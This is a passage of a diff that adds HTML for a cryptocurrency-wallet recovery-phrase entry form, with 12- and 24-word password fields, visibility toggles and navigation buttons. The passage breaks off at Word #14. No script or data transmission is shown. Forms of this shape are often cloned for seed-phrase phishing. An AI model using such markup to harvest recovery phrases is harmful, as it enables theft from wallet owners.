+                         <div class="eyebox-2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word10" placeholder="Word #10" class="word-12">
+                            <div class="eyebox-1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word11" placeholder="Word #11" class="word-12">
+                            <div class="eyebox-1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word12" placeholder="Word #12" class="word-12">
+                            <div class="eyebox-1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyebox-2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                       
+                    </div>
+
+                    <div class="clear-btn">
+                     <button class="btn-clear">Clear all</button>
+                    </div>
+
+                      <div class="btnsback">
+                        <button type="button" class="back-btn">Back</button>
+                        <button class="btn-next btnNext-1" disabled="">Next</button>
+                    </div>
+
+                </form>
+            </div>
+
+             <div class="main-form hide">
+                <form action="#" id="form">
+                    <div class="form-container2">
+                       <div class="box-forms">
+                         <input type="password" name="" id="word-24-1" placeholder="Word #1" class="word-24 word-main">
+                        <div class="eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                        </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-2" placeholder="Word #2" class="word-24 wordMain">
+                            <div class="eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-3" placeholder="Word #3" class="word-24 wordMain">
+                            <div class="eyeClick1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-4" placeholder="Word #4" class="word-24">
+                            <div class="eyeClick1">
+                           <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-5" placeholder="Word #5" class="word-24">
+                            <div class="eyeClick1">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-6" placeholder="Word #6" class="word-24">
+                            <div class="eyeClick1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                           <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-7" placeholder="Word #7" class="word-24">
+                            <div class="eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-8" placeholder="Word #8" class="word-24">
+                            <div class="eyeClick1">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-9" placeholder="Word #9" class="word-24 word-main">
+                            <div class="eyeClick1">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                             <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-10" placeholder="Word #10" class="word-24">
+                            <div class="eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-11" placeholder="Word #11" class="word-24">
+                            <div class="eyeClick1">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                        <div class="eyeClick2 hide">
+                            <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-12" placeholder="Word #12" class="word-24">
+                            <div class="eyeClick1">
+                               <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                          <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+
+                         <div class="box-forms">
+                         <input type="password" name="" id="word-24-13" placeholder="Word #13" class="word-24">
+                            <div class="eyeClick1">
+                           <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z" fill="currentColor"></path><path d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z" fill="currentColor"></path></svg>
+                       </div>
+                         <div class="eyeClick2 hide">
+                              <svg class="text-iconNormal" fill="none" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z" fill="currentColor"></path></svg>
+                       </div>
+                       </div>
+
+                        <div class="box-forms">
+                         <input type="password" name="" id="word-24-14" placeholder="Word #14" class="word-24">
+                            <div class="eyeClick1">
